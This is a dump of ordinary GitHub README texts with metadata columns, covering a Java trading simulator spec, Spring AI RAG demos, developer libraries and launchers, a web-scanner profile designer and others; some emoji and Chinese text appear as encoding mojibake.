- Market Analytics: Shows top and worst performers in the market.
- Transaction History: Displays a list of previous transactions.
- Funds Management: Add funds to the user account for trading.

2.3 User Classes and Characteristics
The system targets two types of users:
- New Users: Users who want to learn stock trading without real financial risks.
- Experienced Users: Traders who wish to test strategies and perform technical analysis in a simulated environment.

2.4 Operating Environment
The system will run in a terminal environment, supported on any platform with Java installed (Windows, macOS, Linux).

2.5 Design and Implementation Constraints
- The system must be implemented in Java, and only terminal-based interactions are allowed.
- The stock data will be simulated; real-time API integration is outside the current scope.
- High-level efficiency in order matching using priority queues is a requirement.

2.6 Assumptions and Dependencies
- Java must be pre-installed on the user's system.
- Market data will be simulated for this version of the application.

3. System Features

3.1 User Registration and Authentication
- Description: The system allows users to register with a username and password and provides a secure login mechanism.
- Input: Username, Password.
- Process: Validates user credentials.
- Output: Success or failure of login or registration.

3.2 Portfolio Management
- Description: Users can manage their stock portfolios, including viewing current holdings and total portfolio value.
- Input: Stock symbol, quantity.
- Output: Portfolio summary showing the value of each holding.

3.3 Stock Trading (Buy/Sell, Short Selling, Margin Trading)
- Description: The user can execute buy, sell, short-sell, and margin trade operations.
- Input: Stock symbol, quantity, order type.
- Output: Execution confirmation, updated portfolio, and balance.

3.4 Limit Orders and Order Matching Engine
- Description: Users can place limit orders and the system will match buy and sell orders using priority queues.
- Input: Stock symbol, quantity, limit price, order type.
- Output: Order matching notifications and execution status.

3.5 Market Simulation and Real-Time Updates
- Description: The market simulation continuously updates stock prices at regular intervals.
- Process: Uses random fluctuations for stock prices in real-time.
- Output: Updated stock prices displayed periodically.

3.6 Market News and Analytics
- Description: The system displays market news updates and analytics for top and worst-performing stocks.
- Output: News feed and market performance summary.

3.7 Technical Indicators (SMA, EMA)
- Description: Users can view technical indicators (Simple and Exponential Moving Averages) for specific stocks over a user-specified period.
- Input: Stock symbol, period for SMA/EMA.
- Output: Calculated SMA/EMA for the given stock.

3.8 Transaction History and Funds Management
- Description: Users can view their transaction history and manage funds by adding money to their accounts.
- Input: Transaction requests, amount to add.
- Output: Transaction history and updated account balance.

4. Non-functional Requirements

4.1 Performance Requirements
- The system should execute order matching efficiently using priority queues, even with a large number of buy/sell orders.
- Real-time stock price updates should occur every 5 seconds without noticeable lag.

4.2 Security Requirements
- Passwords must be stored securely using hashing algorithms.
- All user data must be kept confidential and only accessible to the authenticated user.

4.3 Usability Requirements
- The terminal-based UI must be intuitive, and commands should be simple and clearly documented.
- Error messages should guide users on invalid inputs or failed transactions.

4.4 Reliability Requirements
- The system should handle up to 1000 active users without performance degradation.
- Transactions should be processed accurately, with consistent market simulation updates.

4.5 Maintainability
- The system code should be modular and well-documented for ease of maintenance and future upgrades.

5. External Interface Requirements
No external APIs or interfaces are required in this version of the system. All data (market prices, news, etc.) will be simulated within the application.

6. Other Requirements
The system may require integration with a financial data API in future versions to provide real-time stock prices and news.
(Open Source Project for Hacktoberfest2024)
",0,0,2,Apache-2.0,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
hamsterbase/Burrow-UI,main,"# Burrow UI

![](home.png)

Burrow UI is an open-source, free launcher designed specifically for E-ink devices. Inspired by the Niagara Launcher, Burrow UI offers a minimalist and efficient interface tailored for E-ink screens.

## Features

- **Open Source and Free**: Burrow UI is completely open-source and free to use, with no hidden costs or in-app purchases.
- **No Ads**: Enjoy a clean, distraction-free experience without any advertisements.
- **Offline Functionality**: Works entirely offline, respecting your privacy and conserving battery life.
- **Ultra-Lightweight**: With an installation package of only 130KB, Burrow UI is incredibly light on system resources.
- **E-ink Optimized**: Designed from the ground up for E-ink displays, ensuring optimal readability and performance.

## Installation

Download the latest release of Burrow UI from the [Releases](https://github.com/hamsterbase/Burrow-UI/releases)

## Support Us

If you find Burrow UI helpful, consider supporting our work:

[Buy us a coffee](https://buymeacoffee.com/hamsterbase)

## Our Other Products

Check out our other innovative products:

- [HamsterBase](https://hamsterbase.com) - A privacy-focused and offline-friendly tool for deferred reading.

## License

Distributed under the GNU General Public License v3.0 (GPL-3.0) License. See `LICENSE` for more information.

## Contact

HamsterBase - admin@hamsterbase.com

Project Link: [https://github.com/hamsterbase/burrow-ui](https://github.com/hamsterbase/burrow-ui)

## Acknowledgements

- Inspired by Niagara Launcher
",2,0,3,GPL-3.0,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
coderphonui/jsonautorepair,main,"# LLM JSON auto repair

![Build](https://github.com/coderphonui/jsonautorepair/actions/workflows/maven.yml/badge.svg)

![Coverage](badges/jacoco.svg)


A tiny library to repair JSON string output from LLM. It fixes most of the common issues from the LLM JSON output, eg:

* Remove the ```json``` code block
* Add missing commas
* Add missing double quotes when possible
* Replace single quotes with double quotes
* Escape special characters \t \n
* and many other common issues

## Usage

## Add dependency
    
```xml
    <dependency>
        <groupId>com.cdpn</groupId>
        <artifactId>llm-json-auto-repair</artifactId>
        <version>1.0.1</version>
    </dependency>
```

Your Java code

```java

import com.cdpn.jsonautorepair.JSONAutoRepairer;

JSONAutoRepairer jsonAutoRepairer = new JSONAutoRepairer();
String originalJSON = """"""
                ```json
                {
                    ""name"": ""Alice"",
                    ""sex"": ""female""
                    ""address"": ""123 Andrew Street,
                    ward 3, district 10""
                }
                ```
                """""";
String fixedJSON = jsonAutoRepairer.repair(originalJSON);
```

It will automatically fix the JSON string and return the fixed JSON string if possible. In case the JSON string cannot be fixed, it returns null
",2,0,1,Apache-2.0,2,3.0,1.0,2.0,1.0,12.0,0.0,-3.2,21.0
GluuFederation/gluu4,4.5,"# gluu4
The Gluu Server 4.x Monorepo . The Gluu Server is a container distribution of free open source software (FOSS) for identity and access management (IAM). SaaS, custom, open source and commercial web and mobile applications can leverage a Gluu Server for user authentication, identity information, and policy decisions
",1,10,8,Apache-2.0,6,67.0,1.0,7.0,1.0,28.0,1.0,-9.75,2033.0
ReSpouted/OldSpoutLauncher,master,"# OldSpoutLauncher

Launcher for Spoutcraft 1.6.4

This uses [a patch](https://github.com/ReSpouted/Grease) along with [RetroMCP](https://github.com/ReSpouted/RetroMCP-Legacy)
to reconstruct Spoutcraft's source code without sharing the entirety of Minecraft's code.

**This program must be run with java 8 to work properly.** If you don't know what this means, the scripts in the [releases](https://github.com/ReSpouted/OldSpoutLauncher/releases) will handle everything for you.

## How to run

**When launching the game for the first time, it may look like the launcher is frozen. This is expected, and you just need to wait it out. The times after that will launch faster.**

- Download the file that matches your operating system from [the latest release](https://github.com/ReSpouted/OldSpoutLauncher/releases/latest).
- **Windows:**
  - Open the folder where you downloaded the file with file explorer
  - Right click on the file and select `Extract all...`
  - Once you're done, you'll see a new folder with the same name as the file you downloaded. Open it.
  - Inside you will find a file called `launch` or `launch.ps1`. Right click it and select the option `Run with powershell`.
  - Wait a bit until the launcher window appears. You can then log in and launch the game from there.
- **MacOS:**
  - Open the folder where you downloaded the file with finder
  - Double click the file
  - You'll see a new folder with the same name as the file you downloaded. Select it and press `Command` + `Option` + `C`.
  - Run an application called `Terminal`. (Press `Command` + `Space`, type `Terminal` and press enter)
  - A black window will appear. In it, type `cd ` with a space at the end, then press `Command` (`‚åò`) + `Shift` + `V`, then press enter.
  - type `./launch.sh` then press enter.
  - Wait a bit until the launcher window appears. You can then log in and launch the game from there.
- **Linux:**
  - Launch your terminal. You can probably find it by searching `terminal` in your start menu.
  - type `cd ~/Downloads` (or, if you downloaded the file somewhere else, enter that location instead) and press enter.
  - type `tar -xzf oldspoutlauncher-linux.tar.gz` and press enter.
  - type `cd oldspoutlauncher-linux` and press enter.
  - type `./launch.sh` and press enter.
  - Wait a bit until the launcher window appears. You can then log in and launch the game from there.

",2,0,1,,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
arya2004/leetcode-daily-october-hacktoberfest-2024,main,"

# LeetCode Daily October Hacktoberfest 2024

<div align=""center"">
  <img  src=""https://github.com/user-attachments/assets/e05e9e38-f774-4d29-8121-098cdff8fd69"" alt=""Hacktoberfest Banner"" />
</div>


Welcome to the **LeetCode Daily October Hacktoberfest Challenge 2024**! This repository is dedicated to solving **LeetCode's daily problems** for the month of October, while also giving you the chance to participate in **Hacktoberfest 2024** by contributing to an open-source project. 

## üåü What is Hacktoberfest?

<div align=""center"">
  <img src=""https://github.com/user-attachments/assets/94d07de4-5f01-49e4-a6bc-dc290167768b"" alt=""Hacktoberfest Logo Horizontal"" />
</div>



Hacktoberfest is a month-long celebration of open-source software development, organized by **DigitalOcean**, **GitHub**, and **other partners**. It's a fantastic opportunity to contribute to open-source projects and make an impact on the developer community. Participants who contribute successfully to open-source projects during the month of October are eligible to win **exclusive T-shirts** and **swag**.

For more details, visit the [official Hacktoberfest website](https://hacktoberfest.com).

## üöÄ About This Repository

This repository contains **solutions to LeetCode's daily coding challenges** for October 2024. The primary focus of this repo is to provide solutions in **Java**, **C++**, and **Python**, but contributions in **any language** are welcome.

Each day will have a dedicated issue and folder for the corresponding problem, and contributors can submit solutions in their preferred language.

## üìÇ Repository Structure

Each **day** of October has its own folder in the `solutions/` directory, where contributors can add their solutions in multiple languages. 

## üí° How to Contribute

Contributing is easy and welcome! Here's a step-by-step guide:

### 1. Fork this Repository

Start by **forking** this repository. This will create a copy of the project under your GitHub account.

### 2. Clone the Forked Repository

Next, clone the forked repository to your local machine:

```bash
git clone https://github.com/arya2004/leetcode-daily-october-hacktoberfest-2024.git
```

### 3. Navigate to the Correct Directory

Go to the `solutions/` folder and navigate to the directory corresponding to the day you're contributing to:

```bash
cd solutions/day01
```

### 4. Add Your Solution

You can add your solution in **any language** (e.g., Python, Java, C++, etc.). Here's an example for Python:

```bash
touch solution_python.py
```

Don't forget to add comments to explain your solution and make it easier for others to understand.

### 5. Commit and Push Changes

Once you've added your solution, commit your changes:

```bash
git add .
git commit -m ""Add Day 1 solution in Python""
git push origin main
```

### 6. Open a Pull Request

Go to the original repository and **open a pull request** from your forked version. Make sure to describe your solution and mention the problem you're solving.

We will review your pull request as soon as possible!

## üéØ Contribution Guidelines

Please adhere to the following guidelines when contributing:

1. **One solution per pull request**: Only submit one day's solution per pull request.
2. **Proper documentation**: Add a brief explanation of your approach in the `README.md` file inside the relevant day‚Äôs folder.
3. **Code quality**: Follow best practices for writing clean and efficient code.
4. **Respect the structure**: Place your solution files in the appropriate day's folder under `solutions/`.

For more detailed guidelines, please check the [CONTRIBUTING.md](CONTRIBUTING.md) file.

## üèÜ Hacktoberfest 2024

By contributing to this repository, you are taking part in **Hacktoberfest 2024**. Once you've made four contributions to eligible repositories, you'll be eligible to receive a limited-edition Hacktoberfest Holopin Badge.

<div align=""center"">
  <img src=""https://github.com/user-attachments/assets/45418de7-27e4-4d83-b8d9-6939f264dbc8"" alt=""Hacktoberfest Logo Vertical"" />
</div>


### What to Work On?

- Solve daily LeetCode problems and submit your solutions.
- Add comments explaining your code.
- Contribute to the problem descriptions or documentation.
- Help by reviewing and improving existing solutions.

## üìú License

This repository is licensed under the [MIT License](LICENSE), so feel free to use the code and contribute under the terms of that license.

## üôå Join Us and Start Contributing!

We are excited to see your contributions and help you grow in your open-source journey. Whether you're a beginner or an experienced developer, there's a place for you in this repository.

Let‚Äôs solve problems together and make Hacktoberfest 2024 awesome!

---

",0,31,1,MIT,0,73.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
tzolov/spring-ai-cli-chatbot,main,"# Spring AI Chat Bot CLI

This Spring Boot, CLI, application demonstrates how to create an AI-powered chatbot with domain-specific knowledge (in this case, about Hurricane Milton) using Spring AI, Retrieval-Augmented Generation RAG and Conversational Memory.

Application uses the [Hurricane_Milton](https://en.wikipedia.org/wiki/Hurricane_Milton) wikipage saved as `wikipedia-hurricane-milton-page.pdf`.

## ChatBot Application

quick build run the app.
```
./mvnw clean install
./mvnw spring-boot:run
```

## Auto-configurations

### AI Model

By default, this project uses OpenAI's Spring Boot starter (`spring-ai-openai-spring-boot-starter`). 
However, you can easily switch to any other supported AI model.
The `pom.xml` file prvidew few alternative AI model dependencies. (Note: Most models, except Ollama/Llama3.2, require an API key for access.)
Configure your API key and other model properties in the `application.properties` file.
The [Chat Model API](https://docs.spring.io/spring-ai/reference/api/chatmodel.html) lists all supported modesl.

### Vector Store

The project is configured to use Chroma (`spring-ai-chroma-store-spring-boot-starter`) as a vector store, running locally:
A `docker-compose.yaml` file is provided to start a local Chroma instance.
The project is configured with Spring Boot Docker Compose integration for easy setup. (e.g. you don't have to start the docker-compose manually).
Find more about [Vector Stores](https://docs.spring.io/spring-ai/reference/api/vectordbs.html)

### PDF Document Processing

PDF document reading capability is enabled through the `spring-ai-pdf-document-reader` dependency.
Find more about the Spring AI [document indexing support](https://docs.spring.io/spring-ai/reference/api/etl-pipeline.html)

## CommandLineRunner

`CommandLineRunner` created by the `cli` Bean, is a Spring Boot interface for running code after the application context is loaded.
This is the entry point of our chatbot the application.

## Vector Store Loading

```java
vectorStore.add(new TokenTextSplitter().split(new PagePdfDocumentReader(hurricaneDocs).read()));
```

This line reads a PDF document about Hurricane Milton, splits it into tokens, and adds it to a vector store. This is part of the RAG setup, allowing the chatbot to retrieve relevant information.

## ChatClient Configuration

```java
var chatClient = chatClientBuilder
    .defaultSystem(""You are useful assistant, expert in hurricanes."")
    .defaultAdvisors(new MessageChatMemoryAdvisor(new InMemoryChatMemory()))
    .defaultAdvisors(new QuestionAnswerAdvisor(vectorStore))
    .build();
```

Here, a `ChatClient` is built with the following configurations:
- A system prompt defining the assistant's role
- A `MessageChatMemoryAdvisor` for maintaining conversation history
- A `QuestionAnswerAdvisor` that uses the vector store for RAG capabilities

## Chat Loop

```java
try (Scanner scanner = new Scanner(System.in)) {
    while (true) {
        System.out.print(""\nUSER: "");
        System.out.println(""\nASSISTANT: "" + 
            chatClient.prompt(scanner.nextLine())
                .call()
                .content());
    }
}
```

This creates an infinite loop that:
1. Prompts the user for input
2. Sends the user's input to the chatbot
3. Prints the chatbot's response

The chatbot uses the configured `ChatClient`, which incorporates the conversation history and RAG capabilities to generate responses.

## Key Features

1. **RAG Implementation**: The application uses a vector store to implement RAG, allowing the chatbot to retrieve relevant information from the loaded document.
2. **Conversation Memory**: The `MessageChatMemoryAdvisor` enables the chatbot to remember previous interactions within the conversation.
3. **PDF Document Processing**: The application can read and process PDF documents, making the information available to the chatbot.
4. **Interactive Console Interface**: The application provides a simple console-based interface for interacting with the chatbot.
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Alireza-Moh/whisperer_for_laravel,master,"# ![Whisperer For Laravel](src/main/resources/META-INF/pluginIcon.svg)

[![MIT License](https://img.shields.io/badge/License-MIT-green.svg)](https://choosealicense.com/licenses/mit/)
![JetBrains Plugin Version](https://img.shields.io/jetbrains/plugin/v/at.alirezamoh.idea_whisperer_for_laravel)

# Whisperer for Laravel

Whisperer for Laravel is a PhpStorm plugin to help with Laravel development

## Features

- **Code Creation from template**: Quickly generate laravel components such as Eloquent models, migrations, controllers, seeders, jobs, and more.
- **Code Completion**: Autocomplete for form requests, table names, Blade templates, routes, validation rules and others.
- **Eloquent Magic Fields & Methods/DB Methods**: Generate helper methods for Eloquent helper methods, fields and relations for more autocompletion
- **Inertia.js Support**: Autocomplete and navigation for Inertia pages.
- **Configs**: Autocompletion for config keys.

---

## Installation

To install Whisperer for Laravel in PhpStorm:
1. Navigate to `File > Settings > Plugins > Marketplace`.
2. Search for **Whisperer for Laravel** and install it.

---

## Code Creation Templates

Whisperer for Laravel provides a wide range of code creation templates. Access them via the **All Available Code Creation Templates** or **Search For Code Creation Templates** option in the main menu

### Available Templates

- Eloquent Model
- Migration
- Controller
- Database Seeder
- Config File
- Blade Component
- Console Command
- View
- Job
- Validation Rule
- Policy
- Observer
- Mailable
- Exception
- Event Listener
- Middleware
- Json Resource / Collection
- Form Request
- Eloquent Scope / Cast
- Broadcasting Channel
- Database Factory
- View Composer
---

# Contributions

Feature ideas and suggestions are always welcome! If you have an idea or a request to make Whisperer for Laravel better,
feel free to open an issue or get in touch. Your input plays a vital role in improving the plugin
and making it more helpful for everyone! üöÄ

# License

This plugin is licensed under the MIT License


# Attributions
For more information, please see [Attributions](./ATTRIBUTION.md).",7,0,4,,0,24.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
BountySecurity/GBountyProfilesDesigner,master,"# ![GBounty Profiles Designer Logo](/static/logo.png)

# GBounty Profiles Designer

[![GitHub release](https://img.shields.io/github/release/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/releases)
[![GitHub last commit](https://img.shields.io/github/last-commit/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/commits/main)
[![GitHub issues](https://img.shields.io/github/issues/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/issues)
[![GitHub forks](https://img.shields.io/github/forks/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/network)
[![GitHub stars](https://img.shields.io/github/stars/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/stargazers)
[![GitHub Followers](https://img.shields.io/github/followers/bountysecurity.svg?style=social&label=Follow)](https://github.com/bountysecurity/GBountyProfilesDesigner/)
[![Follow on Twitter](https://img.shields.io/twitter/follow/GBountyProfilesDesigner.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=BountySecurity)

GBounty Profiles Designer empowers you to design intricate multistep web vulnerability profiles using a user-friendly graphical interface.

This tool streamlines the process of creating and customizing GBounty vulnerability profiles, enabling swift integration of novel web vulnerabilities into your assessments.

# ![GBounty Profiles Designer Logo](/static/GBountyProfilesDesigner.png)

**Key Features:**

- **Intuitive Design:** User-friendly graphical interface for creating vulnerability profiles.
- **Advanced Customization:** Add custom insertion points and search types.
- **Comprehensive Evaluations:** Design profiles for both passive and active vulnerabilities.

## GBounty Web Scanner

GBounty is a standalone command-line website vulnerability scanner developed in Golang, designed to help companies, pentesters, and bug hunters identify potential vulnerabilities in web applications.

**Key Benefits:**

- **Fast:** Identifies potential vulnerabilities more quickly, saving you time and effort.
- **Reliable:** Uses different types of scans (active and passive) for comprehensive analysis.
- **Customizable:** Allows easy implementation and search for new vulnerabilities.
- **Integrable:** Can be integrated into your CI scans and runs on Linux, Windows, and macOS.
- **Valuable Information Collection:** Identifies vulnerable parameters, detects software versions, and more.

See the [Documentation](https://gbounty.bountysecurity.ai/) URL for more information.

## Project Statistics

[![Downloads](https://img.shields.io/github/downloads/bountysecurity/GBountyProfilesDesigner/total.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/releases)
[![Contributors](https://img.shields.io/github/contributors/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/graphs/contributors)

## Documentation

For more details on how to use GBounty Profiles Designer, please visit the [Documentation](https://gbounty.bountysecurity.ai/gbounty-profiles-designer) URL.

## Contributions

Contributions are welcome!

## License

This project is licensed under the [MIT License](LICENSE).

## Contact

If you have questions or suggestions, please open an [Issue](https://github.com/BountySecurity/GBountyProfilesDesigner/issues) or contact us directly.

---
",3,1,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Maharramoff/cross-field-validation,master,"# Cross-Field Validation Library

## Unleash the Power of Cross-Field Validation in Java

This library unlocks powerful cross-field validation for your Java applications, enabling you to define complex
constraints that span multiple fields within an object.

### Why You Need This

Jakarta Bean Validation is great for single-field validation, but it falls short when you need to enforce rules that
involve relationships between different fields. This library bridges that gap, providing a flexible and intuitive way to
define and apply cross-field validation.

This solution overcomes the limitations of `ConstraintValidatorContext`, which doesn't allow interference with the
object context when writing field-level validators. There are long-standing open issues on this topic:

- [BVAL-237](https://hibernate.atlassian.net/browse/BVAL-237)
- [BVAL-240](https://hibernate.atlassian.net/browse/BVAL-240)

**Advantages of this library:**

1. **More flexible validations:**  Define complex validation logic involving multiple fields.
2. **Improved readability:** Create custom annotations that resemble built-in constraints like `@NotNull`
   and `@NotEmpty`.
3. **Simplified validation:** Use a single `@EnableCrossFieldConstraints` annotation to enable all custom validators for
   a class.

### Getting Started

**1. Add the Dependency**

```xml

<dependency>
    <groupId>io.github.maharramoff</groupId>
    <artifactId>cross-field-validation</artifactId>
    <version>1.3.0</version>
</dependency>
```

**2. Annotate your class with `@EnableCrossFieldConstraints`**

```java
@EnableCrossFieldConstraints
public class SignupRequestDTO
{
    private String username;
    private String password;

    @MatchWith(""password"")
    private String confirmPassword;
}
```

**3. Implement a custom validator**

```java
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@CrossFieldConstraint(validatedBy = MatchWithValidator.class)
public @interface MatchWith
{
    String field();

    String message() default ""Fields do not match."";
}

public class MatchWithValidator extends BaseCrossFieldValidator
{
    @Override
    public boolean isValid(Object obj, Map<Class<?>, List<Field>> fieldMapping, List<CrossFieldConstraintViolation> violations)
    {
        processFields(obj, fieldMapping, MatchWith.class, (field, annotation) ->
        {
            Object fieldValue      = getProperty(obj, field.getName());
            Object otherFieldValue = getProperty(obj, annotation.field());
            if (fieldValue == null && otherFieldValue == null)
            {
                return; // Both null is considered valid
            }
            if (fieldValue == null || !fieldValue.equals(otherFieldValue))
            {
                violations.add(new CrossFieldConstraintViolation(field.getName(), annotation.message()));
            }
        });
        return violations.isEmpty();
    }
}
```

### How It Works

This library utilizes a ConstraintValidator to manage cross-field validation. Custom validators implement the
CrossFieldConstraintValidator interface, providing the logic for your specific constraints.

**1. Annotation Processing:** When the validation framework encounters the `@EnableCrossFieldConstraints` annotation on
a class, it triggers the `CrossFieldValidationProcessor`.

**2. Validator Execution:** The `CrossFieldValidationProcessor` iterates through
registered `CrossFieldConstraintValidator` implementations.

**3. Field Analysis:** Each validator analyzes the fields of the object, looking for its corresponding annotation (
e.g., `@MatchWith`).

**4. Validation Logic:** If the annotation is present, the validator executes its custom validation logic, comparing
field values as needed.

**5. Violation Reporting:** If a constraint is violated, the validator adds a `CrossFieldConstraintViolation` to the
list, which
is then handled by the validation framework.

### Contributing

Contributions are welcome! Please fork the repository and submit a pull request with your changes. Ensure your code
follows the existing code style and includes appropriate unit tests.",0,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,17.0
danvega/java-rag,main,"# Spring AI RAG Demo

A demonstration project showcasing Retrieval Augmented Generation (RAG) implementation using Spring AI and OpenAI's GPT models. This application enables intelligent document querying by combining the power of Large Language Models (LLMs) with local document context.

## Overview

This project demonstrates how to:
- Ingest PDF documents into a vector database
- Perform semantic searches using Spring AI
- Augment LLM responses with relevant document context
- Create an API endpoint for document-aware chat interactions

## Project Requirements

- Java 23
- Maven
- Docker Desktop
- OpenAI API Key
- Dependencies: [Spring Initializer](https://start.spring.io/#!type=maven-project&language=java&platformVersion=3.3.4&packaging=jar&jvmVersion=23&groupId=dev.danvega&artifactId=markets&name=markets&description=Demo%20project%20for%20Spring%20Boot&packageName=dev.danvega.markets&dependencies=web,spring-ai-openai,spring-ai-pdf-document-reader,spring-ai-vectordb-pgvector,docker-compose)

## Dependencies

The project uses the following Spring Boot starters and dependencies:

```xml
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.ai</groupId>
        <artifactId>spring-ai-openai-spring-boot-starter</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.ai</groupId>
        <artifactId>spring-ai-pdf-document-reader</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.ai</groupId>
        <artifactId>spring-ai-pgvector-store-spring-boot-starter</artifactId>
    </dependency>
</dependencies>
```

## Getting Started

1. Configure your environment variables:
```properties
OPENAI_API_KEY=your_api_key_here
```

2. Update `application.properties`:
```properties
spring.ai.openai.api-key=${OPENAI_API_KEY}
spring.ai.openai.chat.model=gpt-4
spring.ai.vectorstore.pgvector.initialize-schema=true
```

3. Place your PDF documents in the `src/main/resources/docs` directory

## Running the Application

1. Start Docker Desktop

2. Launch the application:
```bash
./mvnw spring-boot:run
```

The application will:
- Start a PostgreSQL database with PGVector extension
- Initialize the vector store schema
- Ingest documents from the configured location
- Start a web server on port 8080

## Key Components

### IngestionService

The `IngestionService` handles document processing and vector store population:

```java
@Component
public class IngestionService implements CommandLineRunner {
    private final VectorStore vectorStore;
    
    @Value(""classpath:/docs/your-document.pdf"")
    private Resource marketPDF;
    
    @Override
    public void run(String... args) {
        var pdfReader = new ParagraphPdfDocumentReader(marketPDF);
        TextSplitter textSplitter = new TokenTextSplitter();
        vectorStore.accept(textSplitter.apply(pdfReader.get()));
    }
}
```

### ChatController

The `ChatController` provides the REST endpoint for querying documents:

```java
@RestController
public class ChatController {
    private final ChatClient chatClient;

    public ChatController(ChatClient.Builder builder, VectorStore vectorStore) {
        this.chatClient = builder
                .defaultAdvisors(new QuestionAnswerAdvisor(vectorStore))
                .build();
    }

    @GetMapping(""/"")
    public String chat() {
        return chatClient.prompt()
                .user(""Your question here"")
                .call()
                .content();
    }
}
```

## Making Requests

Query the API using curl or your preferred HTTP client:

```bash
curl http://localhost:8080/
```

The response will include context from your documents along with the LLM's analysis.

## Architecture Highlights

- **Document Processing**: Uses Spring AI's PDF document reader to parse documents into manageable chunks
- **Vector Storage**: Utilizes PGVector for efficient similarity searches
- **Context Retrieval**: Automatically retrieves relevant document segments based on user queries
- **Response Generation**: Combines document context with GPT-4's capabilities for informed responses

## Best Practices

1. **Document Ingestion**
    - Consider implementing checks before reinitializing the vector store
    - Use scheduled tasks for document updates
    - Implement proper error handling for document processing

2. **Query Optimization**
    - Monitor token usage
    - Implement rate limiting
    - Cache frequently requested information

3. **Security**
    - Secure your API endpoints
    - Protect sensitive document content
    - Safely manage API keys",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
AdamBien/best-of-java-shorts,main,"# üöÄüéâ‚òïÔ∏è The Best of Java Shorts Show by [Adam Bien](http://about.adam-bien.com)

No dependencies, no builds, no compilation, no IDEs.

A selection of Java Shorts from http://youtube.com/bienadam/shorts which I sometimes present on conferences

## Presented at:

1. Devoxx 2024: [The Best of Java Shorts Show: 100 Snippets in 50 Minutes](https://www.youtube.com/embed/t03DOhiTPkc?rel=0)

[![Devoxx 2024: The Best of Java Shorts Show: 100 Snippets in 50 Minutes](https://i.ytimg.com/vi/t03DOhiTPkc/mqdefault.jpg)](https://www.youtube.com/embed/t03DOhiTPkc?rel=0)

[talk description](https://www.devoxx.be/talk/the-best-of-java-shorts-show-100-snippets-in-50-minutes/)

## üõ´ How to run

```shell
git clone https://github.com/AdamBien/best-of-java-shorts
cd best-of-java-shorts
java S00_BoringMain.java 
```

## üí°A ""Short"" Idea

If you have an idea for a new short, or would like to improve an existing one, just open an [issue](https://github.com/AdamBien/best-of-java-shorts/issues)

## FAQ

Q: Why there are multiple shorts with ""100""?

A: Because my ""Java Script"" had a bug and I had no time to fix it üòÄ
",0,2,1,MIT,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
rewerma/ares,main,"# Ares-Access

## ÁõÆÂΩï

- [Ê¶ÇËßà](#Ê¶ÇËßà)
- [Âø´ÈÄüÂºÄÂßã](docs/zh/start/quick-start-ares.md)
- [ÂÆâË£Ö](docs/zh/start/deployment.md)
- [PL-SQLËØ≠Ê≥ï](docs/zh/plsql/ares-plsql.md)
- [ËØ≠Ê≥ïÁ§∫‰æã](#ËØ≠Ê≥ïÁ§∫‰æã)

## Ê¶ÇËßà

Ares-Access ÊòØÂü∫‰∫é `PL-SQL` ËØ≠Ê≥ïÁöÑ ETL„ÄÅË∑®Ê∫êËÆ°ÁÆó„ÄÅÊï∞ÊçÆÂàÜÊûê„ÄÅÂ≠òËÆ°ÂàÜÁ¶ªÁöÑÊï∞ÊçÆËÆ°ÁÆóÈõÜÊàêÂºïÊìé„ÄÇ

![Êû∂ÊûÑÊµÅÁ®ãÂõæ](docs/ares.png)

- ÂäüËÉΩÁâπÊÄß1ÔºöÊîØÊåÅÂ§öÁßçÊï∞ÊçÆÊ∫êËøûÊé•ÔºåÂåÖÊã¨ `Mysql`, `Oracle`, `SQLServer`, `PostgreSQL`, `Hive`, `HDFS`, `FTP`, `SFTP` Á≠âÔºõ
- ÂäüËÉΩÁâπÊÄß2ÔºöÊîØÊåÅË∑®Ê∫êËÆ°ÁÆóÔºåÂèØ‰ª•ËøûÊé•Â§ö‰∏™Ê∫êÁ´ØÂä†ËΩΩÊï∞ÊçÆÂà∞AresÂºïÊìéÂπ∂ÈÄöËøáSparkËøõË°åÂàÜÂ∏ÉÂºèËÆ°ÁÆóÔºåÊúÄÂêéÂ∞ÜÁªìÊûúËæìÂá∫Âà∞ÁõÆÊ†áÁ´ØÔºõ
- ÂäüËÉΩÁâπÊÄß3ÔºöÊîØÊåÅ‰∏∞ÂØåÁöÑDML-SQLËØ≠Ê≥ïÔºåÂåÖÊã¨Ôºö`INSERT`, `UPDATE`, `DELETE`, `MERGE`, `TRUNCATE`Á≠âÔºàÈÉ®ÂàÜÁõÆÊ†áÁ´Ø‰ªÖÊîØÊåÅ`INSERT`ÔºâÔºõ
- ÂäüËÉΩÁâπÊÄß4ÔºöÊîØÊåÅ‰∏∞ÂØåÁöÑËøáÁ®ãËØ≠Ê≥ïÔºåÂåÖÊã¨Ôºö`CREATE PROCEDURE`, `CREATE FUNCION`, `IF`, `FOR`, `WHILE`, `CURSOR`,  `EXCEPTION`Á≠âÔºåËØ¶ÁªÜÂèÇËßÅÔºö[PL-SQLËØ≠Ê≥ï](docs/zh/plsql/ares-plsql.md)
